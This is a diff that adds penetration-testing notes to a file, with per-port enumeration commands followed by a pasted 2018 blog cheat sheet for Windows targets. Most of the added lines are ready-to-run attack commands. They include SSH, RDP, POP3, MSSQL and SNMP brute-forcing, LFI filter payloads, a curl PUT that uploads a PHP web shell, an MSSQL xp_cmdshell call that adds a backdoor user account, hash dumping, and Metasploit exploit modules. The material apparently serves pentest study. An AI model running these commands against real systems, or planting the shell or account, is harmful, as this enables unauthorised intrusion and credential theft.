@@ -430,3 +430,235 @@ http://192.168.56.129/?page=upload   // original page
 http://192.168.0.105/?page=php://filter/convert.base64-encode/resource=upload
 curl http://192.168.0.105/?page=php://filter/convert.base64-encode/resource=upload
 -- The result needs to be decoded from Base64
+
+## Port
+
+21/tcp 
+
+nmap --script ftp-vuln-cve2010-4221 -p 21 <host>
+nmap --script ftp-brute -p 21 <host>
+nmap --script ftp-vsftpd-backdoor -p 21 <host>
+nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.0.0.1 
+
+
+https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands
+https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/
+
+22/TCP
+
+nmap --script ssh2-enum-algos target
+
+nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst \ --script-args ssh-brute.timeout=4s <target>
+
+ nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<username>" <target>
+ nmap -p 22 --script ssh-publickey-acceptance --script-args "ssh.usernames={'root', 'user'}, ssh.privatekeys={'./id_rsa1', './id_rsa2'}" <target> 
+ nmap -p 22 --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "user"}, publickeys={"./id_rsa1.pub", "./id_rsa2.pub"}' <target> 
+ nc -nv 10.11.1.71 22
+
+
+25/TCP
+
+nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=<domain>' -pT:25,465,587 <host>
+nmap --script unusual-port <ip>
+nmap -sV --script=smtp-strangeport <target>
+use auxiliary/scanner/smtp/smtp_version
+
+
+53/TCP
+nmap --script=broadcast-dns-service-discovery www.hackingarticles.in
+nmap -T4 -p 53 --script dns-brute www.hackingarticles.in
+dnsenum --noreverse -o mydomain.xml hackingarticles.in
+dnsrecon -d hackingarticles.in
+
+139/TCP
+
+nmap --script smb-vuln-ms06-025.nse -p139 <host>
+nmap --script smb-enum-users.nse -p139<host>
+nmap --script smb-vuln* host
+nmap --script smb-* --script-args=unsafe=1 192.168.10.55 
+nbtscan -r 10.11.1.128
+nmblookup -A host 	
+smbmap -H 192.168.1.102
+smbclient -L 192.168.1.102
+rpcclient -U "" -N 192.168.1.102
+use scanner/smb/smb_version
+
+
+143/TCP
+nmap -p 143,993 --script imap-brute <host>
+nmap -p 22,443 --script rsa-vuln-roca <target>
+
+
+3306/tcp  open  mysql       
+nmap --script=mysql-enum <target>
+https://www.rapid7.com/db/modules/auxiliary/admin/mysql/mysql_enum
+
+32768/tcp open  status      1 (RPC #100024)
+
+
+80/http
+•  dirbuster (GUI)
+•  dirb http://10.0.0.1/ 
+•  nikto –h 10.0.0.1 
+
+POP3 - Port 110
+use auxiliary/scanner/pop3/pop3_version
+use auxiliary/scanner/pop3/pop3_login
+nmap -sV --script=pop3-brute xxx.xxx.xxx.xxx
+telnet 10.10.10.51 110
+
+nc 10.11.1.72 4555 (jamses server)
+
+
+135/msrpc
+
+use auxiliary/scanner/dcerpc/endpoint_mapper
+
+
+
+=====================================================================================
+
+Enumeration Cheat Sheet for Windows Targets
+
+
+ 
+•  Port 21
+• Port 22
+• Port 25
+• Port 80
+• Port 443
+• Port 135
+• Port 139/445
+• Port 161/162 - UDP 
+• Port 1433
+• Port 1521
+• Port 3306
+• Port 3389
+   
+   Port 21  Enumeration commands for FTP service;  
+  nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn 192.168.1.10   
+  Metasploit Modules for FTP service;   
+•  auxiliary/scanner/ftp/anonymous
+• auxiliary/scanner/ftp/ftp_login
+• auxiliary/scanner/ftp/ftp_version
+• auxiliary/scanner/ftp/konica_ftp_traversal
+ 
+     Port 22  Nmap command for SSH service;  
+  nmap -p 22 -n -v -sV -Pn --script ssh-auth-methods --script-args ssh.user=root 192.168.1.10 nmap -p 22 -n -v -sV -Pn --script ssh-hostkey 192.168.1.10  nmap -p 22 -n -v -sV -Pn --script ssh-brute --script-args userdb=user_list.txt,passdb=password_list.txt 192.168.1.10   
+  Metasploit Modules for SSH service;  
+•  auxiliary/scanner/ssh/fortinet_backdoor
+• auxiliary/scanner/ssh/juniper_backdoor
+• auxiliary/scanner/ssh/ssh_enumusers
+• auxiliary/scanner/ssh/ssh_identify_pubkeys
+• auxiliary/scanner/ssh/ssh_login
+• auxiliary/scanner/ssh/ssh_login_pubkey
+• auxiliary/scanner/ssh/ssh_version
+ 
+     Port 25  Nmap command for SMTP service;  
+  nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn 192.168.1.10   
+  Metasploit Modules for SMTP service;  
+•  auxiliary/scanner/smtp/smtp_enum
+• auxiliary/scanner/smtp/smtp_ntlm_domain
+• auxiliary/scanner/smtp/smtp_relay
+• auxiliary/scanner/smtp/smtp_version 
+ 
+      Port 80  Enumration commands for HTTP service;  
+nikto -h http://192.168.1.10/ 
+curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://192.168.1.10/shell.php 
+sqlmap -u http://192.168.1.10/ --crawl=5 --dbms=mysql 
+cewl http://192.168.1.10/ -m 6 -w special_wordlist.txt 
+medusa -h 192.168.1.10 -u admin -P wordlist.txt -M http -m DIR:/admin -T 10 
+nmap -p 80 -n -v -sV -Pn --script http-backup-finder,http-config-backup,http-errors,http-headers,http-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-php-version,http-qnap-nas-info,http-robots.txt,http-shellshock,http-slowloris-check,http-waf-detect,http-vuln* 192.168.1.10 
+  
+  You can find more information about SQL Injection Types and Uploading Files with SQL Injection from here.
+
+     Port 443  In addition to the HTTP Enumeration commands, you can use the following SSL Scan command for HTTPs Service Enumeration;
+
+sslscan https://192.168.1.10/ 
+
+ Port 135  Enumeration commands for Microsoft RPC service;  
+nmap -n -v -sV -Pn -p 135 --script=msrpc-enum 192.168.1.10  
+  Metasploit Exploit Module for Microsoft RPC service;
+
+
+exploit/windows/dcerpc/ms05_017_msmq
+ 
+   Port 139/445  Enumeration commands for Microsoft SMB service;  
+
+enum4linux -a 192.168.1.10 
+rpcclient -U "" 192.168.1.10 >srvinfo >enumdomusers >getdompwinfo 
+smbclient -L 192.168.1.10 
+smbclient \\192.168.1.10\ipc$ -U administrator 
+smbclient //192.168.1.10/ipc$ -U administrator 
+smbclient //192.168.1.10/admin$ -U administrator 
+nmblookup  -A target ip 
+nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10
+smbmap -H [ip/hostname]
+
+
+ 	Metasploit Modules for Microsoft SMB service;
+
+•  auxiliary/scanner/smb/psexec_loggedin_users
+• auxiliary/scanner/smb/smb_enumshares
+• auxiliary/scanner/smb/smb_enumusers
+• auxiliary/scanner/smb/smb_enumusers_domain
+• auxiliary/scanner/smb/smb_login
+• auxiliary/scanner/smb/smb_lookupsid
+• auxiliary/scanner/smb/smb_ms17_010
+• auxiliary/scanner/smb/smb_version
+ 
+  You can find about more information about Dumping NTLM Hashes from here.  You can find about more information about Passing The NTLM Hashes from here.  
+
+Port 161/162 - UDP  Enumeration commands for SNMP service;  
+nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat 192.168.1.10 onesixtyone -c communities.txt 192.168.1.10 snmp-check -t 192.168.1.10 -c public snmpwalk -c public -v 1 192.168.1.10 [MIB_TREE_VALUE] hydra -P passwords.txt -v 192.168.1.10 snmp #Communities.txt public private community #SNMP MIB Trees 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports 
+  Metasploit Modules for SNMP service;
+
+
+•  auxiliary/scanner/snmp/snmp_enum
+• auxiliary/scanner/snmp/snmp_enum_hp_laserjet
+• auxiliary/scanner/snmp/snmp_enumshares
+• auxiliary/scanner/snmp/snmp_enumusers
+• auxiliary/scanner/snmp/snmp_login
+ 
+   Port 1433  Enumeration commands for MsSQL service;  
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.10 nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password 192.168.1.10 nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user lifeoverpentest MySecretPassword123 /add" 192.168.1.10 sqsh -S 192.168.1.10 -U sa 
+  Metasploit Modules for MsSQL service;
+
+
+•  auxiliary/scanner/mssql/mssql_login
+• auxiliary/admin/mssql/mssql_exec
+• auxiliary/admin/mssql/mssql_enum
+ 
+  You can find more information about Gain Access to Servers with MsSQL and Metasploit from here.  
+   Port 1521  Enumeration commands for Oracle DB service;  
+nmap -n -v -sV -Pn -p 1521 --script=oracle-enum-users --script-args sid=ORCL,userdb=users.txt 192.168.1.10 nmap -n -v -sV -Pn -p 1521 --script=oracle-sid-brute 192.168.1.10 tnscmd10g version -h 192.168.1.10 tnscmd10g status -h 192.168.1.10 
+  Metasploit Modules for Oracle DB service;
+
+
+•  auxiliary/scanner/oracle/emc_sid
+• auxiliary/scanner/oracle/oracle_login 
+• auxiliary/scanner/oracle/sid_brute
+• auxiliary/scanner/oracle/sid_enum
+• auxiliary/scanner/oracle/tnslsnr_version
+• auxiliary/scanner/oracle/tnspoison_checker
+ 
+ 
+  Port 3306  Enumeration commands for MySQL service;  
+nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.10 mysql --host=192.168.1.10 -u root -p 
+  Metasploit Modules for MySQL service;
+
+
+•  auxiliary/scanner/mysql/mysql_authbypass_hashdump
+• auxiliary/scanner/mysql/mysql_login
+• auxiliary/scanner/mysql/mysql_schemadump
+• auxiliary/scanner/mysql/mysql_version
+• auxiliary/scanner/mysql/mysql_writable_dirs
+ 
+   Port 3389  Enumeration commands for Remote Desktop service;  
+ncrack -vv --user administrator -P passwords.txt rdp://192.168.1.10,CL=1 rdesktop 192.168.1.10 
+  Metasploit Modules for Remote Desktop service;
+
+
+•  auxiliary/scanner/rdp/ms12_020_check
+• auxiliary/scanner/rdp/rdp_scanner 
+      Posted 21st February 2018 by Unknown   Labels: cewl cheat sheet enum4linux hydra medusa msrpc MsSQL MySQL nikto nmap onesixtyone Oracle DB smb smbclient smtp snmpwalk sqlmap ssh      
